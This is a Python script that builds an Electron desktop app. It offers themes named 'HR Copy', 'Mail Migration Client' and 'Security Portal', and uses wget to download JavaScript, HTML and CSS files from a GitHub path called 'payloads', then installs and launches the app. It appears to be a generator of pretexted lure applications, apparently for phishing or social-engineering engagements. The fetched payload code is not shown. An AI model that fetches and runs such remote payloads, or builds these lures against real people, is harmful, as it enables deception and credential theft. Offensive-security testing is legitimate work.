import subprocess
import json
import os

def main():
    install_folder_input = input("What is the folder name?\n").strip()
    subprocess.run(["mkdir", install_folder_input])
    path = subprocess.run(["pwd"], capture_output=True, text=True).stdout.strip()
    new_path = os.path.join(path, install_folder_input)
    os.chdir(new_path)
    print(f"Folder created. Trying to install into: {os.getcwd()}\n")

    try:
        subprocess.run(['npm', 'init', '-y'], check=True, text=True, capture_output=True)
        print('npm init completed successfully.\n')
    except subprocess.CalledProcessError as error:
        print('Error running npm init:', error)
    
    display_menu()

def display_menu():
    print("Select the theme:")
    print("1. HR Copy")
    print("2. Mail Migration Client")
    print("3. Security Portal")

    choice = input("Enter your choice: ")
    handle_choice(choice)

def handle_choice(choice):
    if choice == '1':
        subprocess.run(["wget", "https://raw.githubusercontent.com/itssixtyn3in/itssixtyn3in.github.io/main/payloads/migration/index.js"], check=True)
        subprocess.run(["wget", "https://raw.githubusercontent.com/itssixtyn3in/itssixtyn3in.github.io/main/payloads/migration/index.html"], check=True)
        print("Theme downloaded. Continuing to the next step\n")
        update_package_json()
    elif choice == '2':
        subprocess.run(["wget", "https://raw.githubusercontent.com/itssixtyn3in/itssixtyn3in.github.io/main/payloads/migration/index.js"], check=True)
        print("Theme downloaded. Continuing to the next step\n")
        update_package_json()
    elif choice == '3':
        subprocess.run(["wget", "https://raw.githubusercontent.com/itssixtyn3in/itssixtyn3in.github.io/main/payloads/securityportal/index.html"], check=True)
        subprocess.run(["wget", "https://raw.githubusercontent.com/itssixtyn3in/itssixtyn3in.github.io/main/payloads/securityportal/styles.css"], check=True)
        subprocess.run(["wget", "https://raw.githubusercontent.com/itssixtyn3in/itssixtyn3in.github.io/main/payloads/securityportal/index.js"], check=True)
        print("Theme downloaded. Continuing to the next step\n")
        update_package_json()
    else:
        print("Invalid choice. Please enter a valid option.")
        display_menu()


def update_package_json():
    try:
        if not os.path.exists('package.json'):
            # Create a basic package.json if it doesn't exist
            basic_package_json = {
                "name": "your-app-name",
                "version": "1.0.0",
                "description": "Your app description",
                "main": "index.js",
                "scripts": {
                    "start": "electron ."
                },
                "author": "Your Name",
                "license": "MIT"
            }
            with open('package.json', 'w') as file:
                json.dump(basic_package_json, file, indent=2)
                print('Created a basic package.json file.\n')

        with open('package.json', 'r+') as file:
            content = file.read().strip()
            if not content:
                # If the file is empty, write the basic structure
                basic_package_json = {
                    "name": "your-app-name",
                    "version": "1.0.0",
                    "description": "Your app description",
                    "main": "index.js",
                    "scripts": {
                        "start": "electron ."
                    },
                    "author": "Your Name",
                    "license": "MIT"
                }
                json.dump(basic_package_json, file, indent=2)
                print('Filled an empty package.json file with a basic structure.\n')
            else:
                package_json = json.loads(content)
                package_json['scripts']['start'] = 'electron .'
                file.seek(0)
                json.dump(package_json, file, indent=2)
                file.truncate()

        print('package.json updated successfully.\n')
        print('Attempting Electron install..\n')
        install_electron()
    except (IOError, json.JSONDecodeError) as error:
        print('Error reading/writing package.json:', error)



def install_electron():
    try:
        subprocess.run(['npm', 'install', 'electron', '--save-dev'], check=True)
        print('Electron installed successfully.\n')
        subprocess.run(['npm', 'run', 'start'], check=True)
    except subprocess.CalledProcessError as error:
        print('Error installing/running Electron:', error)

if __name__ == "__main__":
    main()
